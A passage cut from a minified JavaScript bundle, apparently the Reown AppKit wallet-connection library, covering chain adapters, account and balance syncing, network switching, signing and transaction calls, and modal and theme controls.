0:i.request({method:"wallet_switchEthereumChain",params:[{chainId:bs(r.id)}]}))}catch(l){if(l.code===Vh.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||l.code===Vh.ERROR_INVALID_CHAIN_ID||l.code===Vh.ERROR_CODE_DEFAULT||((o=(s=l==null?void 0:l.data)==null?void 0:s.originalError)==null?void 0:o.code)===Vh.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)try{await((u=n.provider)==null?void 0:u.request({method:"wallet_addEthereumChain",params:[{chainId:bs(r.id),rpcUrls:[(a=r==null?void 0:r.rpcUrls.chainDefault)==null?void 0:a.http],chainName:r.name,nativeCurrency:r.nativeCurrency,blockExplorerUrls:[(c=r.blockExplorers)==null?void 0:c.default.url]}]}))}catch{throw new Error("Chain is not supported")}}n.provider.setDefaultChain(r.caipNetworkId)}getWalletConnectProvider(){const e=this.connectors.find(n=>n.type==="WALLET_CONNECT");return e==null?void 0:e.provider}}class dW{constructor(e){this.chainNamespaces=[],this.reportedAlertErrors={},this.getCaipNetwork=(r,n)=>{var i,s,o,a;if(r){const c=(s=(i=q.getNetworkData(r))==null?void 0:i.requestedCaipNetworks)==null?void 0:s.find(l=>l.id===n);if(c)return c;const u=(o=q.getNetworkData(r))==null?void 0:o.caipNetwork;return u||((a=q.getRequestedCaipNetworks(r).filter(l=>l.chainNamespace===r))==null?void 0:a[0])}return q.state.activeCaipNetwork||this.defaultCaipNetwork},this.getCaipNetworkId=()=>{const r=this.getCaipNetwork();if(r)return r.id},this.getCaipNetworks=r=>q.getCaipNetworks(r),this.getActiveChainNamespace=()=>q.state.activeChain,this.setRequestedCaipNetworks=(r,n)=>{q.setRequestedCaipNetworks(r,n)},this.getApprovedCaipNetworkIds=()=>q.getAllApprovedCaipNetworkIds(),this.getCaipAddress=r=>q.state.activeChain===r||!r?q.state.activeCaipAddress:q.getAccountProp("caipAddress",r),this.setClientId=r=>{_e.setClientId(r)},this.getProvider=r=>lt.getProvider(r),this.getProviderType=r=>lt.getProviderId(r),this.getPreferredAccountType=r=>{var n;return(n=pe.state.preferredAccountTypes)==null?void 0:n[r]},this.setCaipAddress=(r,n)=>{pe.setCaipAddress(r,n)},this.setBalance=(r,n,i)=>{pe.setBalance(r,n,i)},this.setProfileName=(r,n)=>{pe.setProfileName(r,n)},this.setProfileImage=(r,n)=>{pe.setProfileImage(r,n)},this.setUser=(r,n)=>{pe.setUser(r,n),te.state.enableEmbedded&&nr.close()},this.resetAccount=r=>{pe.resetAccount(r)},this.setCaipNetwork=r=>{q.setActiveCaipNetwork(r)},this.setCaipNetworkOfNamespace=(r,n)=>{q.setChainNetworkData(n,{caipNetwork:r})},this.setAllAccounts=(r,n)=>{pe.setAllAccounts(r,n),te.setHasMultipleAddresses((r==null?void 0:r.length)>1)},this.setStatus=(r,n)=>{pe.setStatus(r,n),Oe.isConnected()?le.setConnectionStatus("connected"):le.setConnectionStatus("disconnected")},this.getAddressByChainNamespace=r=>q.getAccountProp("address",r),this.setConnectors=r=>{const n=[...Oe.state.allConnectors,...r];Oe.setConnectors(n)},this.fetchIdentity=r=>_e.fetchIdentity(r),this.getReownName=r=>C2.getNamesForAddress(r),this.getConnectors=()=>Oe.getConnectors(),this.getConnectorImage=r=>T1.getConnectorImage(r),this.setConnectedWalletInfo=(r,n)=>{const i=lt.getProviderId(n),s=r?{...r,type:i}:void 0;pe.setConnectedWalletInfo(s,n)},this.getIsConnectedState=()=>!!q.state.activeCaipAddress,this.addAddressLabel=(r,n,i)=>{pe.addAddressLabel(r,n,i)},this.removeAddressLabel=(r,n)=>{pe.removeAddressLabel(r,n)},this.getAddress=r=>q.state.activeChain===r||!r?pe.state.address:q.getAccountProp("address",r),this.setApprovedCaipNetworksData=r=>q.setApprovedCaipNetworksData(r),this.resetNetwork=r=>{q.resetNetwork(r)},this.addConnector=r=>{Oe.addConnector(r)},this.resetWcConnection=()=>{At.resetWcConnection()},this.setAddressExplorerUrl=(r,n)=>{pe.setAddressExplorerUrl(r,n)},this.setSmartAccountDeployed=(r,n)=>{pe.setSmartAccountDeployed(r,n)},this.setSmartAccountEnabledNetworks=(r,n)=>{q.setSmartAccountEnabledNetworks(r,n)},this.setPreferredAccountType=(r,n)=>{pe.setPreferredAccountType(r,n)},this.setEIP6963Enabled=r=>{te.setEIP6963Enabled(r)},this.handleUnsafeRPCRequest=()=>{if(this.isOpen()){if(this.isTransactionStackEmpty())return;this.redirect("ApproveTransaction")}else this.open({view:"ApproveTransaction"})},this.options=e,this.version=e.sdkVersion,this.caipNetworks=this.extendCaipNetworks(e),this.chainNamespaces=this.getChainNamespacesSet(e.adapters,this.caipNetworks),this.defaultCaipNetwork=this.extendDefaultCaipNetwork(e),this.chainAdapters=this.createAdapters(e.adapters),this.initialize(e)}getChainNamespacesSet(e,r){const n=e==null?void 0:e.map(s=>s.namespace).filter(s=>!!s);if(n!=null&&n.length)return[...new Set(n)];const i=r==null?void 0:r.map(s=>s.chainNamespace);return[...new Set(i)]}async initialize(e){this.initControllers(e),await this.initChainAdapters(),await this.injectModalUi(),this.sendInitializeEvent(e),$i.set({initialized:!0}),await this.syncExistingConnection()}sendInitializeEvent(e){var n;const{...r}=e;delete r.adapters,delete r.universalProvider,wt.sendEvent({type:"track",event:"INITIALIZE",properties:{...r,networks:e.networks.map(i=>i.id),siweConfig:{options:((n=e.siweConfig)==null?void 0:n.options)||{}}}})}initControllers(e){this.initializeOptionsController(e),this.initializeChainController(e),this.initializeThemeController(e),this.initializeConnectionController(e),this.initializeConnectorController()}initializeThemeController(e){e.themeMode&&jr.setThemeMode(e.themeMode),e.themeVariables&&jr.setThemeVariables(e.themeVariables)}initializeChainController(e){if(!this.connectionControllerClient||!this.networkControllerClient)throw new Error("ConnectionControllerClient and NetworkControllerClient must be set");q.initialize(e.adapters??[],this.caipNetworks,{connectionControllerClient:this.connectionControllerClient,networkControllerClient:this.networkControllerClient});const r=this.getDefaultNetwork();r&&q.setActiveCaipNetwork(r)}initializeConnectionController(e){At.setWcBasic(e.basic??!1)}initializeConnectorController(){Oe.initialize(this.chainNamespaces)}initializeOptionsController(e){var o;te.setDebug(e.debug!==!1),te.setEnableWalletConnect(e.enableWalletConnect!==!1),te.setEnableWalletGuide(e.enableWalletGuide!==!1),te.setEnableWallets(e.enableWallets!==!1),te.setEIP6963Enabled(e.enableEIP6963!==!1),te.setEnableNetworkSwitch(e.enableNetworkSwitch!==!1),te.setEnableAuthLogger(e.enableAuthLogger!==!1),te.setCustomRpcUrls(e.customRpcUrls),te.setSdkVersion(e.sdkVersion),te.setProjectId(e.projectId),te.setEnableEmbedded(e.enableEmbedded),te.setAllWallets(e.allWallets),te.setIncludeWalletIds(e.includeWalletIds),te.setExcludeWalletIds(e.excludeWalletIds),te.setFeaturedWalletIds(e.featuredWalletIds),te.setTokens(e.tokens),te.setTermsConditionsUrl(e.termsConditionsUrl),te.setPrivacyPolicyUrl(e.privacyPolicyUrl),te.setCustomWallets(e.customWallets),te.setFeatures(e.features),te.setAllowUnsupportedChain(e.allowUnsupportedChain),te.setUniversalProviderConfigOverride(e.universalProviderConfigOverride),te.setDefaultAccountTypes(e.defaultAccountTypes);const r=le.getPreferredAccountTypes(),n={...te.state.defaultAccountTypes,...r};pe.setPreferredAccountTypes(n);const i=this.getDefaultMetaData();if(!e.metadata&&i&&(e.metadata=i),te.setMetadata(e.metadata),te.setDisableAppend(e.disableAppend),te.setEnableEmbedded(e.enableEmbedded),te.setSIWX(e.siwx),!e.projectId){Wo.open(qo.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error");return}if(((o=e.adapters)==null?void 0:o.find(a=>a.namespace===Z.CHAIN.EVM))&&e.siweConfig){if(e.siwx)throw new Error("Cannot set both `siweConfig` and `siwx` options");te.setSIWX(e.siweConfig.mapToSIWX())}}getDefaultMetaData(){var e,r,n,i;return typeof window<"u"&&typeof document<"u"?{name:((r=(e=document.getElementsByTagName("title"))==null?void 0:e[0])==null?void 0:r.textContent)||"",description:((n=document.querySelector('meta[property="og:description"]'))==null?void 0:n.content)||"",url:window.location.origin,icons:[((i=document.querySelector('link[rel~="icon"]'))==null?void 0:i.href)||""]}:null}setUnsupportedNetwork(e){const r=this.getActiveChainNamespace();if(r){const n=ki.getUnsupportedNetwork(`${r}:${e}`);q.setActiveCaipNetwork(n)}}getDefaultNetwork(){return ki.getCaipNetworkFromStorage(this.defaultCaipNetwork)}extendCaipNetwork(e,r){return ki.extendCaipNetwork(e,{customNetworkImageUrls:r.chainImages,projectId:r.projectId})}extendCaipNetworks(e){return ki.extendCaipNetworks(e.networks,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId})}extendDefaultCaipNetwork(e){const r=e.networks.find(i=>{var s;return i.id===((s=e.defaultNetwork)==null?void 0:s.id)});return r?ki.extendCaipNetwork(r,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId}):void 0}createClients(){this.connectionControllerClient={connectWalletConnect:async()=>{var s;const e=q.state.activeChain,r=this.getAdapter(e),n=(s=this.getCaipNetwork(e))==null?void 0:s.id;if(!r)throw new Error("Adapter not found");const i=await r.connectWalletConnect(n);this.close(),this.setClientId((i==null?void 0:i.clientId)||null),le.setConnectedNamespaces([...q.state.chains.keys()]),this.chainNamespaces.forEach(o=>{Oe.setConnectorId(Gt.CONNECTOR_TYPE_WALLET_CONNECT,o)}),await this.syncWalletConnectAccount()},connectExternal:async({id:e,info:r,type:n,provider:i,chain:s,caipNetwork:o})=>{var g,y,m,b,A,_;const a=q.state.activeChain,c=s||a,u=this.getAdapter(c);if(s&&s!==a&&!o){const T=this.getCaipNetworks().find(P=>P.chainNamespace===s);T&&this.setCaipNetwork(T)}if(!u)throw new Error("Adapter not found");const l=this.getCaipNetwork(c),h=await u.connect({id:e,info:r,type:n,provider:i,chainId:(o==null?void 0:o.id)||(l==null?void 0:l.id),rpcUrl:((m=(y=(g=o==null?void 0:o.rpcUrls)==null?void 0:g.default)==null?void 0:y.http)==null?void 0:m[0])||((_=(A=(b=l==null?void 0:l.rpcUrls)==null?void 0:b.default)==null?void 0:A.http)==null?void 0:_[0])});if(!h)return;le.addConnectedNamespace(c),this.syncProvider({...h,chainNamespace:c});const{accounts:d}=await u.getAccounts({namespace:c,id:e});this.setAllAccounts(d,c),this.setStatus("connected",c)},reconnectExternal:async({id:e,info:r,type:n,provider:i})=>{var a;const s=q.state.activeChain,o=this.getAdapter(s);o!=null&&o.reconnect&&(await(o==null?void 0:o.reconnect({id:e,info:r,type:n,provider:i,chainId:(a=this.getCaipNetwork())==null?void 0:a.id})),le.addConnectedNamespace(s))},disconnect:async e=>{const r=e||q.state.activeChain,n=this.getAdapter(r),i=lt.getProvider(r),s=lt.getProviderId(r);await(n==null?void 0:n.disconnect({provider:i,providerType:s})),le.removeConnectedNamespace(r),lt.resetChain(r),this.setUser(void 0,r),this.setStatus("disconnected",r)},checkInstalled:e=>e?e.some(r=>{var n;return!!((n=window.ethereum)!=null&&n[String(r)])}):!!window.ethereum,signMessage:async e=>{const r=this.getAdapter(q.state.activeChain),n=await(r==null?void 0:r.signMessage({message:e,address:pe.state.address,provider:lt.getProvider(q.state.activeChain)}));return(n==null?void 0:n.signature)||""},sendTransaction:async e=>{if(e.chainNamespace===Z.CHAIN.EVM){const r=this.getAdapter(q.state.activeChain),n=lt.getProvider(q.state.activeChain),i=await(r==null?void 0:r.sendTransaction({...e,caipNetwork:this.getCaipNetwork(),provider:n}));return(i==null?void 0:i.hash)||""}return""},estimateGas:async e=>{if(e.chainNamespace===Z.CHAIN.EVM){const r=this.getAdapter(q.state.activeChain),n=lt.getProvider(q.state.activeChain),i=this.getCaipNetwork();if(!i)throw new Error("CaipNetwork is undefined");const s=await(r==null?void 0:r.estimateGas({...e,provider:n,caipNetwork:i}));return(s==null?void 0:s.gas)||0n}return 0n},getEnsAvatar:async()=>{var n;const e=this.getAdapter(q.state.activeChain),r=await(e==null?void 0:e.getProfile({address:pe.state.address,chainId:Number((n=this.getCaipNetwork())==null?void 0:n.id)}));return(r==null?void 0:r.profileImage)||!1},getEnsAddress:async e=>{const r=this.getAdapter(q.state.activeChain),n=this.getCaipNetwork();if(!n)return!1;const i=await(r==null?void 0:r.getEnsAddress({name:e,caipNetwork:n}));return(i==null?void 0:i.address)||!1},writeContract:async e=>{const r=this.getAdapter(q.state.activeChain),n=this.getCaipNetwork(),i=this.getCaipAddress(),s=lt.getProvider(q.state.activeChain);if(!n||!i)throw new Error("CaipNetwork or CaipAddress is undefined");const o=await(r==null?void 0:r.writeContract({...e,caipNetwork:n,provider:s,caipAddress:i}));return o==null?void 0:o.hash},parseUnits:(e,r)=>{const n=this.getAdapter(q.state.activeChain);return(n==null?void 0:n.parseUnits({value:e,decimals:r}))??0n},formatUnits:(e,r)=>{const n=this.getAdapter(q.state.activeChain);return(n==null?void 0:n.formatUnits({value:e,decimals:r}))??"0"},getCapabilities:async e=>{const r=this.getAdapter(q.state.activeChain);return await(r==null?void 0:r.getCapabilities(e))},grantPermissions:async e=>{const r=this.getAdapter(q.state.activeChain);return await(r==null?void 0:r.grantPermissions(e))},revokePermissions:async e=>{const r=this.getAdapter(q.state.activeChain);return r!=null&&r.revokePermissions?await r.revokePermissions(e):"0x"},walletGetAssets:async e=>{const r=this.getAdapter(q.state.activeChain);return await(r==null?void 0:r.walletGetAssets(e))??{}}},this.networkControllerClient={switchCaipNetwork:async e=>await this.switchCaipNetwork(e),getApprovedCaipNetworksData:async()=>this.getApprovedCaipNetworksData()},At.setClient(this.connectionControllerClient)}getApprovedCaipNetworksData(){var r,n,i,s,o;if(lt.getProviderId(q.state.activeChain)===Gt.CONNECTOR_TYPE_WALLET_CONNECT){const a=(n=(r=this.universalProvider)==null?void 0:r.session)==null?void 0:n.namespaces;return{supportsAllNetworks:((o=(s=(i=this.universalProvider)==null?void 0:i.session)==null?void 0:s.peer)==null?void 0:o.metadata.name)==="MetaMask Wallet",approvedCaipNetworkIds:this.getChainsFromNamespaces(a)}}return{supportsAllNetworks:!0,approvedCaipNetworkIds:[]}}async switchCaipNetwork(e){if(!e)return;const r=e.chainNamespace;if(this.getAddressByChainNamespace(e.chainNamespace)){const i=lt.getProvider(r),s=lt.getProviderId(r);if(e.chainNamespace===q.state.activeChain){const o=this.getAdapter(r);await(o==null?void 0:o.switchNetwork({caipNetwork:e,provider:i,providerType:s}))}else if(this.setCaipNetwork(e),s===Gt.CONNECTOR_TYPE_WALLET_CONNECT)this.syncWalletConnectAccount();else{const o=this.getAddressByChainNamespace(r);o&&this.syncAccount({address:o,chainId:e.id,chainNamespace:r})}}else this.setCaipNetwork(e)}getChainsFromNamespaces(e={}){return Object.values(e).flatMap(r=>{const n=r.chains||[],i=r.accounts.map(s=>{const{chainId:o,chainNamespace:a}=Ps.parseCaipAddress(s);return`${a}:${o}`});return Array.from(new Set([...n,...i]))})}createAdapters(e){return this.createClients(),this.chainNamespaces.reduce((r,n)=>{var s;const i=e==null?void 0:e.find(o=>o.namespace===n);return i?(i.construct({namespace:n,projectId:(s=this.options)==null?void 0:s.projectId,networks:this.getCaipNetworks()}),r[n]=i):r[n]=new hW({namespace:n,networks:this.getCaipNetworks()}),r},{})}async initChainAdapter(e){var r;this.onConnectors(e),this.listenAdapter(e),(r=this.chainAdapters)==null||r[e].syncConnectors(this.options,this),await this.createUniversalProviderForAdapter(e)}async initChainAdapters(){await Promise.all(this.chainNamespaces.map(async e=>{await this.initChainAdapter(e)}))}onConnectors(e){const r=this.getAdapter(e);r==null||r.on("connectors",this.setConnectors.bind(this))}listenAdapter(e){const r=this.getAdapter(e);if(!r)return;const n=le.getConnectionStatus();n==="connected"?this.setStatus("connecting",e):n==="disconnected"?(le.clearAddressCache(),this.setStatus(n,e)):this.setStatus(n,e),r.on("switchNetwork",({address:i,chainId:s})=>{const o=this.getCaipNetworks().find(u=>u.id===s||u.caipNetworkId===s),a=q.state.activeChain===e,c=q.getAccountProp("address",e);if(o){const u=a&&i?i:c;u&&this.syncAccount({address:u,chainId:o.id,chainNamespace:e})}else this.setUnsupportedNetwork(s)}),r.on("disconnect",this.disconnect.bind(this,e)),r.on("pendingTransactions",()=>{const i=pe.state.address,s=q.state.activeCaipNetwork;!i||!(s!=null&&s.id)||this.updateNativeBalance(i,s.id,s.chainNamespace)}),r.on("accountChanged",({address:i,chainId:s})=>{var a,c;const o=q.state.activeChain===e;o&&s?this.syncAccount({address:i,chainId:s,chainNamespace:e}):o&&((a=q.state.activeCaipNetwork)!=null&&a.id)?this.syncAccount({address:i,chainId:(c=q.state.activeCaipNetwork)==null?void 0:c.id,chainNamespace:e}):this.syncAccountInfo(i,s,e)})}async createUniversalProviderForAdapter(e){var r,n,i;await this.getUniversalProvider(),this.universalProvider&&((i=(n=(r=this.chainAdapters)==null?void 0:r[e])==null?void 0:n.setUniversalProvider)==null||i.call(n,this.universalProvider))}async syncExistingConnection(){await Promise.allSettled(this.chainNamespaces.map(e=>this.syncNamespaceConnection(e)))}async syncNamespaceConnection(e){try{const r=Oe.getConnectorId(e);switch(this.setStatus("connecting",e),r){case Z.CONNECTOR_ID.WALLET_CONNECT:await this.syncWalletConnectAccount();break;case Z.CONNECTOR_ID.AUTH:break;default:await this.syncAdapterConnection(e)}}catch(r){console.warn("AppKit couldn't sync existing connection",r),this.setStatus("disconnected",e)}}async syncAdapterConnection(e){var o,a,c;const r=this.getAdapter(e),n=Oe.getConnectorId(e),i=this.getCaipNetwork(e),s=Oe.getConnectors(e).find(u=>u.id===n);try{if(!r||!s)throw new Error(`Adapter or connector not found for namespace ${e}`);if(!(i!=null&&i.id))throw new Error("CaipNetwork not found");const u=await(r==null?void 0:r.syncConnection({namespace:e,id:s.id,chainId:i.id,rpcUrl:(c=(a=(o=i==null?void 0:i.rpcUrls)==null?void 0:o.default)==null?void 0:a.http)==null?void 0:c[0]}));if(u){const l=await(r==null?void 0:r.getAccounts({namespace:e,id:s.id}));l&&l.accounts.length>0?this.setAllAccounts(l.accounts,e):this.setAllAccounts([Ie.createAccount(e,u.address,"eoa")],e),this.syncProvider({...u,chainNamespace:e}),await this.syncAccount({...u,chainNamespace:e}),this.setStatus("connected",e)}else this.setStatus("disconnected",e)}catch{this.setStatus("disconnected",e)}}async syncWalletConnectAccount(){const e=this.chainNamespaces.map(async r=>{var a,c,u,l,h;const n=this.getAdapter(r),i=((l=(u=(c=(a=this.universalProvider)==null?void 0:a.session)==null?void 0:c.namespaces)==null?void 0:u[r])==null?void 0:l.accounts)||[],s=(h=q.state.activeCaipNetwork)==null?void 0:h.id,o=i.find(d=>{const{chainId:g}=Ps.parseCaipAddress(d);return g===(s==null?void 0:s.toString())})||i[0];if(o){const d=Ps.validateCaipAddress(o),{chainId:g,address:y}=Ps.parseCaipAddress(d);if(lt.setProviderId(r,Gt.CONNECTOR_TYPE_WALLET_CONNECT),this.caipNetworks&&q.state.activeCaipNetwork&&(n==null?void 0:n.namespace)!==Z.CHAIN.EVM){const m=n==null?void 0:n.getWalletConnectProvider({caipNetworks:this.getCaipNetworks(),provider:this.universalProvider,activeCaipNetwork:q.state.activeCaipNetwork});lt.setProvider(r,m)}else lt.setProvider(r,this.universalProvider);Oe.setConnectorId(Z.CONNECTOR_ID.WALLET_CONNECT,r),le.addConnectedNamespace(r),this.syncWalletConnectAccounts(r),await this.syncAccount({address:y,chainId:g,chainNamespace:r})}else this.setStatus("disconnected",r);await q.setApprovedCaipNetworksData(r)});await Promise.all(e)}syncWalletConnectAccounts(e){var n,i,s,o,a;const r=(a=(o=(s=(i=(n=this.universalProvider)==null?void 0:n.session)==null?void 0:i.namespaces)==null?void 0:s[e])==null?void 0:o.accounts)==null?void 0:a.map(c=>{const{address:u}=Ps.parseCaipAddress(c);return u}).filter((c,u,l)=>l.indexOf(c)===u);r&&this.setAllAccounts(r.map(c=>Ie.createAccount(e,c,e==="bip122"?"payment":"eoa")),e)}syncProvider({type:e,provider:r,id:n,chainNamespace:i}){lt.setProviderId(i,e),lt.setProvider(i,r),Oe.setConnectorId(n,i)}async syncAccount(e){var h,d;const r=e.chainNamespace===q.state.activeChain,n=q.getCaipNetworkByNamespace(e.chainNamespace,e.chainId),{address:i,chainId:s,chainNamespace:o}=e,{chainId:a}=le.getActiveNetworkProps(),c=s||a,u=((h=q.state.activeCaipNetwork)==null?void 0:h.name)===Z.UNSUPPORTED_NETWORK_NAME,l=q.getNetworkProp("supportsAllNetworks",o);if(this.setStatus("connected",o),!(u&&!l)&&c){let g=this.getCaipNetworks().find(b=>b.id.toString()===c.toString()),y=this.getCaipNetworks().find(b=>b.chainNamespace===o);if(!l&&!g&&!y){const b=this.getApprovedCaipNetworkIds()||[],A=b.find(T=>{var P;return((P=Ps.parseCaipNetworkId(T))==null?void 0:P.chainId)===c.toString()}),_=b.find(T=>{var P;return((P=Ps.parseCaipNetworkId(T))==null?void 0:P.chainNamespace)===o});g=this.getCaipNetworks().find(T=>T.caipNetworkId===A),y=this.getCaipNetworks().find(T=>T.caipNetworkId===_||"deprecatedCaipNetworkId"in T&&T.deprecatedCaipNetworkId===_)}const m=g||y;(m==null?void 0:m.chainNamespace)===q.state.activeChain?te.state.enableNetworkSwitch&&!te.state.allowUnsupportedChain&&((d=q.state.activeCaipNetwork)==null?void 0:d.name)===Z.UNSUPPORTED_NETWORK_NAME?q.showUnsupportedChainUI():this.setCaipNetwork(m):r||n&&this.setCaipNetworkOfNamespace(n,o),this.syncConnectedWalletInfo(o),Vf.isLowerCaseMatch(i,pe.state.address)||this.syncAccountInfo(i,m==null?void 0:m.id,o),r?await this.syncBalance({address:i,chainId:m==null?void 0:m.id,chainNamespace:o}):await this.syncBalance({address:i,chainId:n==null?void 0:n.id,chainNamespace:o})}}async syncAccountInfo(e,r,n){const i=this.getCaipAddress(n),s=r||(i==null?void 0:i.split(":")[1]);if(!s)return;const o=`${n}:${s}:${e}`;this.setCaipAddress(o,n),await this.syncIdentity({address:e,chainId:s,chainNamespace:n})}async syncReownName(e,r){try{const n=await this.getReownName(e);if(n[0]){const i=n[0];this.setProfileName(i.name,r)}else this.setProfileName(null,r)}catch{this.setProfileName(null,r)}}syncConnectedWalletInfo(e){var i;const r=Oe.getConnectorId(e),n=lt.getProviderId(e);if(n===Gt.CONNECTOR_TYPE_ANNOUNCED||n===Gt.CONNECTOR_TYPE_INJECTED){if(r){const s=this.getConnectors().find(o=>o.id===r);if(s){const{info:o,name:a,imageUrl:c}=s,u=c||this.getConnectorImage(s);this.setConnectedWalletInfo({name:a,icon:u,...o},e)}}}else if(n===Gt.CONNECTOR_TYPE_WALLET_CONNECT){const s=lt.getProvider(e);s!=null&&s.session&&this.setConnectedWalletInfo({...s.session.peer.metadata,name:s.session.peer.metadata.name,icon:(i=s.session.peer.metadata.icons)==null?void 0:i[0]},e)}else if(r)if(r===Z.CONNECTOR_ID.COINBASE){const s=this.getConnectors().find(o=>o.id===Z.CONNECTOR_ID.COINBASE);this.setConnectedWalletInfo({name:"Coinbase Wallet",icon:this.getConnectorImage(s)},e)}else this.setConnectedWalletInfo({name:r},e)}async syncBalance(e){!qu.getNetworksByNamespace(this.getCaipNetworks(),e.chainNamespace).find(n=>{var i;return n.id.toString()===((i=e.chainId)==null?void 0:i.toString())})||!e.chainId||await this.updateNativeBalance(e.address,e.chainId,e.chainNamespace)}async updateNativeBalance(e,r,n){const i=this.getAdapter(n),s=q.getCaipNetworkByNamespace(n,r);if(i){const o=await i.getBalance({address:e,chainId:r,caipNetwork:s,tokens:this.options.tokens});this.setBalance(o.balance,o.symbol,n)}}async initializeUniversalAdapter(){var n,i,s,o,a,c,u,l,h,d;const e=bq.createLogger((g,...y)=>{g&&this.handleAlertError(g),console.error(...y)}),r={projectId:(n=this.options)==null?void 0:n.projectId,metadata:{name:(i=this.options)!=null&&i.metadata?(s=this.options)==null?void 0:s.metadata.name:"",description:(o=this.options)!=null&&o.metadata?(a=this.options)==null?void 0:a.metadata.description:"",url:(c=this.options)!=null&&c.metadata?(u=this.options)==null?void 0:u.metadata.url:"",icons:(l=this.options)!=null&&l.metadata?(h=this.options)==null?void 0:h.metadata.icons:[""]},logger:e};te.setManualWCControl(!!((d=this.options)!=null&&d.manualWCControl)),this.universalProvider=this.options.universalProvider??await kF.init(r),this.listenWalletConnect()}listenWalletConnect(){this.universalProvider&&(this.universalProvider.on("display_uri",e=>{At.setUri(e)}),this.universalProvider.on("connect",At.finalizeWcConnection),this.universalProvider.on("disconnect",()=>{this.chainNamespaces.forEach(e=>{this.resetAccount(e)}),At.resetWcConnection()}),this.universalProvider.on("chainChanged",e=>{const r=this.getCaipNetworks().find(i=>i.id==e),n=this.getCaipNetwork();if(!r){this.setUnsupportedNetwork(e);return}(n==null?void 0:n.id)!==(r==null?void 0:r.id)&&this.setCaipNetwork(r)}),this.universalProvider.on("session_event",e=>{if(Yf.isSessionEventData(e)){const{name:r,data:n}=e.params.event;r==="accountsChanged"&&Array.isArray(n)&&Ie.isCaipAddress(n[0])&&this.syncAccount(Ps.parseCaipAddress(n[0]))}}))}createUniversalProvider(){var e;return!this.universalProviderInitPromise&&Ie.isClient()&&((e=this.options)!=null&&e.projectId)&&(this.universalProviderInitPromise=this.initializeUniversalAdapter()),this.universalProviderInitPromise}async getUniversalProvider(){if(!this.universalProvider)try{await this.createUniversalProvider()}catch(e){wt.sendEvent({type:"error",event:"INTERNAL_SDK_ERROR",properties:{errorType:"UniversalProviderInitError",errorMessage:e instanceof Error?e.message:"Unknown",uncaught:!1}}),console.error("AppKit:getUniversalProvider - Cannot create provider",e)}return this.universalProvider}handleAlertError(e){const r=Object.entries(qo.UniversalProviderErrors).find(([,{message:a}])=>e.message.includes(a)),[n,i]=r??[],{message:s,alertErrorKey:o}=i??{};if(n&&s&&!this.reportedAlertErrors[n]){const a=qo.ALERT_ERRORS[o];a&&(Wo.open(a,"error"),this.reportedAlertErrors[n]=!0)}}getAdapter(e){var r;if(e)return(r=this.chainAdapters)==null?void 0:r[e]}createAdapter(e){var i;if(!e)return;const r=e.namespace;if(!r)return;this.createClients();const n=e;n.namespace=r,n.construct({namespace:r,projectId:(i=this.options)==null?void 0:i.projectId,networks:this.getCaipNetworks()}),this.chainNamespaces.includes(r)||this.chainNamespaces.push(r),this.chainAdapters&&(this.chainAdapters[r]=n)}async open(e){if(await this.injectModalUi(),e!=null&&e.uri&&At.setUri(e.uri),e!=null&&e.arguments)switch(e==null?void 0:e.view){case"Swap":return nr.open({...e,data:{swap:e.arguments}})}return nr.open(e)}async close(){await this.injectModalUi(),nr.close()}setLoading(e,r){nr.setLoading(e,r)}async disconnect(e){await At.disconnect(e)}getError(){return""}getChainId(){var e;return(e=q.state.activeCaipNetwork)==null?void 0:e.id}async switchNetwork(e){const r=this.getCaipNetworks().find(n=>n.id===e.id);if(!r){Wo.open(qo.ALERT_ERRORS.SWITCH_NETWORK_NOT_FOUND,"error");return}await q.switchActiveNetwork(r)}getWalletProvider(){return q.state.activeChain?lt.state.providers[q.state.activeChain]:null}getWalletProviderType(){return lt.getProviderId(q.state.activeChain)}subscribeProviders(e){return lt.subscribeProviders(e)}getThemeMode(){return jr.state.themeMode}getThemeVariables(){return jr.state.themeVariables}setThemeMode(e){jr.setThemeMode(e),F2(jr.state.themeMode)}setTermsConditionsUrl(e){te.setTermsConditionsUrl(e)}setPrivacyPolicyUrl(e){te.setPrivacyPolicyUrl(e)}setThemeVariables(e){jr.setThemeVariables(e),sW(jr.state.themeVariables)}subscribeTheme(e){return jr.subscribe(e)}getWalletInfo(){return pe.state.connectedWalletInfo}getAccount(e){var s;const r=Oe.getAuthConnector(e),n=q.getAccountData(e),i=q.state.activeChain;if(n)return{allAccounts:n.allAccounts,caipAddress:n.caipAddress,address:Ie.getPlainAddress(n.caipAddress),isConnected:!!n.caipAddress,status:n.status,embeddedWalletInfo:r?{user:n.user?{...n.user,username:le.getConnectedSocialUsername()}:void 0,authProvider:n.socialProvider||"email",accountType:(s=n.preferredAccountTypes)==null?void 0:s[e||i],isSmartAccountDeployed:!!n.smartAccountDeployed}:void 0}}subscribeAccount(e,r){const n=()=>{const i=this.getAccount(r);i&&e(i)};r?q.subscribeChainProp("accountState",n,r):q.subscribe(n),Oe.subscribe(n)}subscribeNetwork(e){return q.subscribe(({activeCaipNetwork:r})=>{e({caipNetwork:r,chainId:r==null?void 0:r.id,caipNetworkId:r==null?void 0:r.caipNetworkId})})}subscribeWalletInfo(e){return pe.subscribeKey("connectedWalletInfo",e)}subscribeShouldUpdateToAddress(e){pe.subscribeKey("shouldUpdateToAddress",e)}subscribeCaipNetworkChange(e){q.subscribeKey("activeCaipNetwork",e)}getState(){return $i.state}subscribeState(e){return $i.subscribe(e)}showErrorMessage(e){kr.showError(e)}showSuccessMessage(e){kr.showSuccess(e)}getEvent(){return{...wt.state}}subscribeEvents(e){return wt.subscribe(e)}replace(e){at.replace(e)}redirect(e){at.push(e)}popTransactionStack(e){at.popTransactionStack(e)}isOpen(){return nr.state.open}isTransactionStackEmpty(){return at.state.transactionStack.length===0}isTransactionShouldReplaceView(){var e;return(e=at.state.transactionStack[at.state.transactionStack.length-1])==null?void 0:e.replace}static getInstance(){return this.instance}updateFeatures(e){te.setFeatures(e)}updateOptions(e){const n={...te.state||{},...e};te.setOptions(n)}setConnectMethodsOrder(e){te.setConnectMethodsOrder(e)}setWalletFeaturesOrder(e){te.setWalletFeaturesOrder(e)}setCollapseWallets(e){te.setCollapseWallets(e)}setSocialsOrder(e){te.setSocialsOrder(e)}getConnectMethodsOrder(){return x0.getConnectOrderMethod(te.state.features,Oe.getConnectors())}addNetwork(e,r){if(this.chainAdapters&&!this.chainAdapters[e])throw new 